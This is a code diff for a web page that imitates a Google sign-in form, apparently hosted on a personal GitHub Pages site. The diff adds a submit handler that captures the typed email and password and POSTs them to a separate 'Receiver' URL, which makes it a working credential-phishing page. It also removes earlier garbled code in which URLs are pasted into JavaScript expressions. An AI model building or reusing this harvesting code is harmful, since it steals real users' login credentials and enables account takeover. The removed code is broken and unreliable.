@@ -22,7 +22,7 @@
                 <label>Password</label>
               </div>
               <div class="forgot">
-                <button type="button">Forgot your password?<button>
+                <button type="button">Forgot your password?</button>
               </div>
           
           <input type="submit" name="sign-in" value="Sign In" id="submitbutton">
@@ -34,20 +34,36 @@
         const Email = document.getElementById('email');
         const Password = document.getElementById('password');
 
-        const channel = new MessageChannel();
-        const myPort = channel.https://dominator200.github.io/Google-login/?email=gzbhgb%40z8h.com&text=uhbbhbguh&sign-in=Sign+In;
-        const targetFrame = window.top.frames[1];
-        const targetOrigin = "https://dominator200.github.io/Receiver8787462385790687/";
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        const messageControl = document.getElementById("PasswordValue");
-        const channelMessageButton = document.getElementById("submitbutton");
+            const emailValue = Email.value;
+            const passwordValue = Password.value;
 
-        channelMessageButton.addEventListener("click", () => {
-          myPort.postMessage(messageControl.value);
+              // Create a FormData object to send the data as form-urlencoded
+            const formData = new FormData();
+            formData.append('email', emailValue);
+            formData.append('text', passwordValue);
+            formData.append('sign-in', 'Sign In');
+
+            fetch('https://dominator200.github.io/Receiver8787462385790687/', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                // You may need to set additional headers based on the server's requirements
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+        })
+            .then(response => response.json()) // Adjust this based on the expected response type
+            .then(data => {
+                // Handle the response data here
+                console.log('Server response:', data);
+            })
+            .catch(error => {
+            // Handle errors here
+                console.error('Error:', error);
+            });
         });
-
-        targetFrame.postMessage("init", targetOrigin, [channel.https://dominator200.github.io/Receiver8787462385790687/]);
-          
       </script>
 </body>
 </html>
